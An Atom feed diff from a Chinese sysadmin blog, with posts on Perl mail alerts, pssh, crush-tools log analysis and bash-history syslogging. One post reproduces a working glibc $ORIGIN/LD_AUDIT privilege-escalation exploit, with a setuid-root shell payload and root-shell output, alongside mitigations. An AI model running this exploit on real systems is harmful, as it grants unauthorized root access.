@@ -1,0 +1,376 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[分类: 其它 | 小明明s à domicile]]></title>
+  <link href="http://dongweiming.github.com/blog/blog/categories/qi-ta/atom.xml" rel="self"/>
+  <link href="http://dongweiming.github.com/blog/"/>
+  <updated>2015-10-24T21:27:48+08:00</updated>
+  <id>http://dongweiming.github.com/blog/</id>
+  <author>
+    <name><![CDATA[Dongweiming]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[使用可以带选项的perl发送中文邮件]]></title>
+    <link href="http://dongweiming.github.com/blog/archives/shiyongkeyidaixuanxiangdeperlfasongzhongwenyoujian/"/>
+    <updated>2011-08-13T00:00:00+08:00</updated>
+    <id>http://dongweiming.github.com/blog/archives/shiyongkeyidaixuanxiangdeperlfasongzhongwenyoujian</id>
+    <content type="html"><![CDATA[<p>为了处理复杂事件处理的故障报警，需要使用perl语言实现邮件报警和短信报警</p>
+
+<p><pre class="sh_perl">
+#!/usr/bin/perl
+use strict;
+use Getopt::Long;
+use MIME::Lite;
+use MIME::Words qw(encode_mimewords);
+
+<p>my ($title,$sendto,$cc,@data,$help);</p>
+
+<p>GetOptions(
+    'title|t=s'	    =&gt; \$title,
+    'sendto|s=s'    =&gt; \$sendto,
+    'cc|c=s'	    =&gt; \$cc,
+    'data|d=s{1,10}'=&gt; \@data,
+    'h|help'	    =&gt; \$help,
+);</p>
+
+<p>if ( $help ) {
+print &lt;&lt;EOF;
+    -t	--title	    标题
+    -s	--sendto    收件人
+    -c	--cc	    抄送人
+    -d	--data	    内容
+    -h	--help	    帮助
+EOF
+}
+my @ltime=localtime;
+my $today=sprintf("%04d%02d%02d",$ltime[5]+1900,$ltime[4]+1,$ltime[3]);
+open LOG,"&gt;&gt;/cepdata/notification.log.$today";</p>
+
+<p>my $data="@data";
+$data =~ s/=/:/g;
+my $subject = encode_mimewords("$title",'Charset','GB2312');
+$sendto =~ s/(?=,|$)/\@dongwm.com/g;
+$cc =~ s/(?=,|$)/\@dongwm.com/g if $cc;</p>
+
+<p>my $msg = MIME::Lite-&gt;new (
+        From =&gt; 'cep@dongwm.com',
+        To =&gt; $sendto,
+	Cc  =&gt; $cc,
+        Subject =&gt; $subject,
+        Type     =&gt; 'text/html',
+        Data     =&gt; $data,
+        Encoding =&gt; 'base64',
+    ) or die "create container failed: $!";</p>
+
+<p>$msg-&gt;attr('content-type.charset' =&gt; 'GB2312');
+$msg-&gt;send('smtp','localhost',Debug=&gt;0);
+my @time=localtime;
+my $currenttime=sprintf("%04d-%02d-%02d %02d:%02d:%02d",$time[5]+1900,$time[4]+1,$time[3],$time[2],$time[1],$time[0]);
+print LOG "$currenttime send mail to $sendto : \"$data\"\n";
+</p>
+</pre></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[使用pssh进行并行批量操作]]></title>
+    <link href="http://dongweiming.github.com/blog/archives/%E4%BD%BF%E7%94%A8pssh%E8%BF%9B%E8%A1%8C%E5%B9%B6%E8%A1%8C%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C/"/>
+    <updated>2011-04-22T00:00:00+08:00</updated>
+    <id>http://dongweiming.github.com/blog/archives/使用pssh进行并行批量操作</id>
+    <content type="html"><![CDATA[<p><strong>假如同时给上千台服务器执行一个命令,拷贝一个文件,杀一个进程等,有什么简化运维管理的工具呢?在小型使用中我都是使用for循环,数量巨大,一方面不确定操作是否成功,一方面for循环语句性能不好估计且是不是同步并行执行.，这类工具比如pdsh，mussh，cssh，dsh等还有这里提到的pssh:
+1  安装:</strong>
+<pre class="sh_bash">#wget http://peak.telecommunity.com/dist/ez_setup.py
+python ez_setup.py
+#wget http://parallel-ssh.googlecode.com/files/pssh-2.2.2.tar.gz
+# tar zxvf pssh-2.2.2.tar.gz
+# cd pssh-2.2.2
+# python setup.py install</pre>
+<strong>2  pssh使用 (假设ssh已做好SSH信任,ssh信任请参看:<a href="http://www.dongwm.com/archives/%E5%85%B3%E4%BA%8Essh%E5%91%BD%E4%BB%A4%E7%A0%94%E7%A9%B6%E4%BB%A5%E5%8F%8Assh%E4%BF%A1%E4%BB%BB%E8%AF%A6%E8%A7%A3/" target="_blank">关于ssh命令研究以及SSH信任详解</a>)</strong>
+pssh工具包主要有5个程序:
+<strong>1 pssh  多主机并行运行命令</strong>
+<pre class="sh_bash">[root@server pssh-2.2.2]# pssh -P -h test.txt uptime
+192.168.9.102:  14:04:58 up 26 days, 17:05,  0 users,  load average: 0.07, 0.02, 0.00
+192.168.9.102: [1] 14:04:58 [SUCCESS] 192.168.9.102 9922
+192.168.8.171:  14:04:59 up 35 days,  2:01,  6 users,  load average: 0.00, 0.00, 0.00
+192.168.8.171: [2] 14:04:59 [SUCCESS] 192.168.8.171 22
+192.168.9.104:  14:04:59 up 7 days, 20:59,  0 users,  load average: 0.10, 0.04, 0.01
+192.168.9.104: [3] 14:04:59 [SUCCESS] 192.168.9.104 9922
+[root@server pssh-2.2.2]# cat test.txt
+192.168.9.102:9922
+192.168.9.104:9922
+192.168.8.171:22   //注意我的端口号不仅是默认的22
+假如想将输出重定向到一个文件 加-o file 选项</pre>
+<strong>2 pscp  把文件并行地复制到多个主机上</strong>
+注意 是从服务器端给客户端传送文件:
+<pre class="sh_bash">[root@server pssh-2.2.2]# pscp -h test.txt /etc/sysconfig/network /tmp/network   //标示将本地的/etc/sysconfig/network传到目标服务器的/tmp/network</pre>
+<strong>3 prsync 使用rsync协议从本地计算机同步到远程主机</strong>
+<pre class="sh_bash">[root@server ~]# pssh -h test.txt -P mkdir /tmp/etc
+[root@server ~]# prsync -h test.txt -l dongwm -a -r /etc/sysconfig /tmp/etc //标示将本地的/etc/sysconfig目录递归同步到目标服务器的 /tmp/etc目录下,并保持原来的时间戳,使用用户 dongwm</pre>
+<strong>4  pslurp 将文件从远程主机复制到本地,和pscp方向相反:</strong>
+<pre class="sh_bash">[root@server ~]# pslurp -h test.txt   -L /tmp/test -l root /tmp/network test  //标示将目标服务器的/tmp/network文件复制到本地的/tmp/test目录下,并更名为test
+[1] 14:53:54 [SUCCESS] 192.168.9.102 9922
+[2] 14:53:54 [SUCCESS] 192.168.9.104 9922
+[root@server ~]# ll /tmp/test/192.168.9.10
+192.168.9.102/ 192.168.9.104/
+[root@server ~]# ll /tmp/test/192.168.9.102/
+总计 4.0K
+-rw-r--r-- 1 root root 60 2011-04-22 14:53 test
+[root@server ~]# ll /tmp/test/192.168.9.104/
+总计 4.0K
+-rw-r--r-- 1 root root 60 2011-04-22 14:53 test</pre>
+<strong>5  pnuke 并行在远程主机杀进程:</strong>
+<pre class="sh_bash">[root@server ~]# pnuke -h test.txt   syslog //杀死目标服务器的syslog进程,只要ps进程中出现相关词语 都能杀死
+[1] 15:05:14 [SUCCESS] 192.168.9.102 9922
+[2] 15:05:14 [SUCCESS] 192.168.9.104 9922</pre>
+<div id="livemargins_control" style="position: absolute; display: none; z-index: 9999;"><img style="position: absolute; left: -77px; top: -5px;" src="chrome://livemargins/skin/monitor-background-horizontal.png" alt="" width="77" height="5" /> <img style="position: absolute; left: 0; top: -5px;" src="chrome://livemargins/skin/monitor-background-vertical.png" alt="" /> <img id="monitor-play-button" style="position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.5" src="chrome://livemargins/skin/monitor-play-button.png" alt="" /></div>
+<div class="zemanta-pixie"><img class="zemanta-pixie-img" src="http://img.zemanta.com/pixy.gif?x-id=eb2641aa-47eb-83ae-b8a8-d1a0b97e174d" alt="" /></div></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[使用crush-tools分析apache访问日志]]></title>
+    <link href="http://dongweiming.github.com/blog/archives/ok/"/>
+    <updated>2011-02-21T00:00:00+08:00</updated>
+    <id>http://dongweiming.github.com/blog/archives/ok</id>
+    <content type="html"><![CDATA[<p><strong>crush（Custom Reporting Utilities for SHell）是用于处理数据的工具包，在这里我用来分析apache访问日志，它的网址是http://code.google.com/p/crush-tools/，我所要说的是其强大的性能和功能。</strong></p>
+
+<p><strong>1  下载安装：</strong></p>
+
+<p><pre class="sh_bash"># wget http://crush-tools.googlecode.com/files/crush-tools-2010-03.tar.gz &amp;&amp; tar zxvf crush-tools-2010-03.tar.gz &amp;&amp; cd crush-tools-2010-03  &amp;&amp; ./configure --prefix=/opt/dongwm &amp;&amp; make &amp;&amp; make install</pre></p>
+
+<p>将其加入$PATH以便操作：</p>
+
+<p>#export PATH=$PATH:/opt/dongwm/bin</p>
+
+<p><strong>2  介绍本文使用到的工具包主要的命令：</strong></p>
+
+<p>aggregates 将分离数据集合，比如想知道某网页某段时间的访问量</p>
+
+<p>csvformat  将文件转换成csv格式</p>
+
+<p><tt>convdate  将数据转换日期格式，比如我们想按天统计</tt></p>
+
+<p>cutfield    当取得的数据有些不重要,可以使用此参数去掉那些列</p>
+
+<p><strong>3  设置：</strong></p>
+
+<p><strong>1  设置apache访问日志格式：</strong></p>
+
+<p>我使用默认的apache访问日志格式（httpd.conf中定义）：
+<pre class="sh_bash">LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+LogFormat "%h %l %u %t \"%r\" %&gt;s %b" common
+LogFormat "%{Referer}i -&gt; %U" referer
+LogFormat "%{User-agent}i" agent</pre>
+<strong>2  以下是perl脚本，用来格式化日志文件：</strong></p>
+
+<p><pre class="sh_bash">[root@dongwm tmp]# cat  Format.pl
+#!/usr/bin/perl -w
+use strict;
+if (! open LOGFILE,"$ARGV[0]"){
+die "logfile not exists!($!)"
+}
+my $output_delim = $ENV{DELIMITER} || chr(0xfe);
+my $VirtualName=$ARGV[1];
+# (dropping the RFC 1413 identity field)
+print join($output_delim,
+qw(IP 日期 时间 方式 页面 返回时间 平均处理时间)),qq(\n);
+while (&lt;LOGFILE&gt;) {
+if (/((?:\d{1,3})(?:\.\d{1,3}){3}|-)   # 1 IP
+(?:,.*)?\s+(\d+-\d+-\d+)\s+       # 2 日期
+(\d+:\d+:\d+)\s+                   # 3 时
+(GET|POST)\s+                     # 4 方法
+"(.*?\.php?)\??.*"\s+             # 5 URL
+(\d{3})\s+                        # 6 返回码
+(\d+.\d+).*$/x                    # 7 处理时间
+)
+{
+print join($output_delim, ($1,$2,$3,$4,$5,$6,$7,$VirtualName)),qq(\n);
+}
+}
+exit(0);</pre></p>
+
+<p><strong>3 从ZXTM负载均衡设备上提取apache日志，我这里只一行用来说明：</strong></p>
+
+<p><pre class="sh_bash">48.29.102.43 2011-03-15 00:00:22 GET "/Lifeonline/NewIndex.php?MatchType=DWMet" 200 0.025989 7860 "http://www.dongwm.com/Test/DWMetIndex.php?ThisType=Lift" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; MDDC; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
+
+<p>格式化后：</p>
+
+<p>#./Format.pl zxtm.log www|csvformat</p>
+
+<p>"48.29.102.43","2011-03-15","00:00:22","GET","/Lifeonline/NewIndex.php","200","0.025989","www"</p>
+
+<p>4 几种对网站内容性能测试体验：</p>
+
+<p><strong>1 查看用户访问各页面的数量：</strong></p>
+
+<p><pre class="sh_bash"># ./Format.pl zxtm.log www|aggregate -k 5 -c 5 |csvformat  //其中-k 表示选择第五列作为key选择的主键，输出结果会显示此列，-c表示对第五列的主键进行统计次数，根据上面格式化后的信息可以知道，第五列也就是/Lifeonline/NewIndex.php，计算这个页面访问的次数
+
+<p>输出如下：</p>
+
+<p>"/Lifeonline/NewIndex.php","7"</p>
+
+<p><strong>2 查看网站每页面响应时间最慢时间：</strong></p>
+
+<p><pre class="sh_bash"># ./Format.pl zxtm.log www |aggregate -k 3,5 -x 7
+
+<p>"00:00:20","/OKAdmin/index.php","0.038450"
+"00:00:20","/Remoting/gateway.php","0.104104"
+"00:00:20","/Remoting/json.php","0.247292"
+"00:00:20","/User/UserCenter.php","0.492700"
+"00:00:20","/WapAPI/v1.php","0.297009"</p>
+
+<p><strong>3 查找页面影响最慢的页面:</strong></p>
+
+<p><pre class="sh_bash"># ./Format.pl zxtm.log www|aggregate -p  -K 平均处理时间,页面|csvformat
+
+<p>"0.766413","/Buy/UserBetList.php"
+"0.871648","/Lottery06/SportterySoccer/SportteryTest.php"
+"1.021357","/Lottery06/SportterySoccer/SportteryTest.php"
+"2.170618","/Buy/UserBetList.php"
+"3.906909","/Buy06/PassStat.php"</p>
+
+<p>注:命令中-k -c -s等小学字母是以前的版本 新版支持大写+相对应的标签  这个命令 最初使用小写参数选项时候出现了一定的报错,但是使用大写参数就可以了,并且再去用小写也可以了,一个BUG</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+</pre></p></pre></p></pre></p></pre></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[syslog记录history历史记录]]></title>
+    <link href="http://dongweiming.github.com/blog/archives/syslog%E8%AE%B0%E5%BD%95history%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/"/>
+    <updated>2010-12-20T00:00:00+08:00</updated>
+    <id>http://dongweiming.github.com/blog/archives/syslog记录history历史记录</id>
+    <content type="html"><![CDATA[<p>工作中可能会有无聊的黑客在你服务器上转悠，黑客智商都不错，所有离开的时候就会删除history记录。怎么办才能记录下用户的历史记录呢？</p>
+
+<p><strong>原理</strong>：将history记录到syslog上面，并实时的传送到了远端的日志集中服务器上。</p>
+
+<p><strong>方法</strong>：使用bash4.1的新功能：历史命令保存到syslog！然后使用syslog-ng构建集中型日志服务器收集主机日志。<!--more--></p>
+
+<p><strong>1 下载bash：</strong>
+#wget http://ftp.gnu.org/gnu/bash/bash-4.1.tar.gz
+#tar zxvf bash-4.1.tar.gz –C /usr/local/bash-4.1
+#cd /usr/local/bash-4.1
+<strong>2 修改参数(根据个人需要，我只保留了pid，uid，sid等，参数请看目录下的shell.c中)：</strong>
+文件bashhist.c大约708行的位置开始，修改成以下一段：</p>
+
+<p>[ccine_perl height="100%" width="99%"]
+syslog (SYSLOG_FACILITY|SYSLOG_LEVEL, "HISTORY: PID=%d PPID=%d SID=%d User=%s CMD=%s", getpid(), getppid(), getsid(getpid()), current_user.user_name, line);
+else
+{
+strncpy (trunc, line, SYSLOG_MAXLEN);
+trunc[SYSLOG_MAXLEN - 1] = '\0';
+syslog (SYSLOG_FACILITY|SYSLOG_LEVEL, "HISTORY (TRUNCATED): PID=%d PPID=%d SID=%d User=%s CMD=%s", getpid(), getppid(), getsid(getpid()), current_user.user_name, trunc);
+}[/ccine_perl]
+<span style="background-color: #ff0000;">注</span>：ppid：跟踪sh切换后的用户
+Sid： 跟踪 su 切换后的用户
+第二段代表log长度超过600后使用的语句
+<strong>3 去掉config-top.h中define SYSLOG_HISTORY的注释。</strong></p>
+
+<p>结果如下：
+#define SYSLOG_HISTORY
+<strong> 4 编译安装
+</strong> # ./configure &amp; make &amp;&amp; make install
+<strong>5 修改用户配置：
+</strong> 将用户的bash换成现在的bash4.1
+# vi /etc/passwd
+dongwm:x:501:501::/home/dongwm:/usr/local/bash_4.1/bin/bash
+这样日志就会记在/var/log/messages
+结果类似这样：[ccine_perl height="100%" width="99%"]
+Dec 23 17:40:28 server -bash: HISTORY: PID=4089 PPID=4088 SID=4089 User=dongwm CMD=exit
+Dec 23 17:41:47 server -bash: HISTORY: PID=4282 PPID=4278 SID=4282 User=root CMD=exit
+Dec 23 17:41:53 server -bash: HISTORY: PID=4321 PPID=4317 SID=4321 User=root CMD=ssh java00
+Dec 23 17:44:09 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=vi Clean_javalog.sh
+Dec 23 17:45:16 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=sh Clean_javalog.sh
+Dec 23 17:45:30 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=cat /dev/shm/cleanJavaLog.log
+Dec 23 17:46:08 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=vi Clean_javalog.sh
+Dec 23 17:48:54 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=cat Clean_javalog.sh </p>
+
+<p>......[/ccine_perl]
+在整个环境布置了记录功能，就能方便的查出来谁-在何时，用什么账号，做了什么操作...
+
+<strong>6 主机syslog配置（添加日志服务器的地址）</strong>
+# vi /etc/syslog.conf</p>
+
+<p>在最后添加一列：
+*.* @server.dongwm.com
+<strong>7 搭建日志服务器
+</strong> 请参看：<span style="background-color: #00ff00;">http://wenku.baidu.com/view/c3bb49c58bd63186bcebbc7a.html</span></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[linux gcc++漏洞：普通用户获得root权限]]></title>
+    <link href="http://dongweiming.github.com/blog/archives/linux-gcc%E6%BC%8F%E6%B4%9E%EF%BC%9A%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90/"/>
+    <updated>2010-11-01T00:00:00+08:00</updated>
+    <id>http://dongweiming.github.com/blog/archives/linux-gcc漏洞：普通用户获得root权限</id>
+    <content type="html"><![CDATA[<p><strong>前言：经我测试在RHEL5 / CentOS5 / FC13都成功了。</strong></p>
+
+<p>首先介绍下一下具体步骤中涉及到的2个频繁的出现的词语:</p>
+
+<p>taviso:作者 Tavis Ormandy 的简称，<a href="http://www.wohuia.com/Topic/3554851" target="_blank">Google</a>信息安全工程师 个人微博：http://my.opera.com/taviso/blog/   <a rel="nofollow" href="http://twitter.com/taviso">http://twitter.com/taviso</a>
+<strong>exploit：</strong>自己创建的目录，表意漏洞利用，可以取任何名字。<!--more--></p>
+
+<p>原理：<strong>The GNU C library dynamic linker expands $ORIGIN in setuid library search path  详见作者博客</strong>
+<img title="更多..." src="http://64.120.134.162/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif" alt="" />
+[cc lang='abap' ]
+$ mkdir /tmp/exploit</p>
+
+<p>$ ln /bin/ping /tmp/exploit/target</p>
+
+<p>$ exec 3&lt; /tmp/exploit/target</p>
+
+<p>$ ls -l /proc/$$/fd/3
+lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -&gt; /tmp/exploit/target*</p>
+
+<p>$ rm -rf /tmp/exploit/</p>
+
+<p>$ ls -l /proc/$$/fd/3
+lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -&gt; /tmp/exploit/target (deleted)</p>
+
+<p>$ cat &gt; payload.c
+void __attribute__((constructor)) init()
+{
+    setuid(0);
+    system("/bin/bash");
+}
+^D
+$ gcc -w -fPIC -shared -o /tmp/exploit payload.c
+$ ls -l /tmp/exploit
+-rwxrwx--- 1 taviso taviso 4.2K Oct 15 09:22 /tmp/exploit*</p>
+
+<p>$ LD_AUDIT="$ORIGIN" exec /proc/self/fd/3
+sh-4.1# whoami
+root
+sh-4.1# id
+uid=0(root) gid=500(taviso)
+[/cc]</p>
+
+<p>看到了吧！是不是很恐怖。以下有2种解决办法：</p>
+
+<p><strong>1，绑定目录</strong></p>
+
+<p><strong>需要理解一下nosuid的原理：<span id="__end"><span style="font-family: Arial; color: #0000ff; font-size: x-small;"><strong /></span></span></strong>
+我的理解是：比如/etc/passwd这个文件，本来只有root有权限修改，但是用户本身也可以去修改自己的密码，这就是一种“超出它本身权限的行为”，
+nosuid就是为了停止这种提升特权的办法。比如/tmp目录就有这样的权限，我们就需要对它控制。
+[cc lang='abap' ]
+# mount -o bind /tmp /tmp
+# mount -o remount,bind,nosuid /tmp /tmp
+
+[/cc]
+<strong>2，升级glibc版本（红帽官方提供的解决办法）</strong>
+[cc lang='abap' ]
+#yum update  glibc
+[/cc]</p>
+]]></content>
+  </entry>
+  
+</feed>
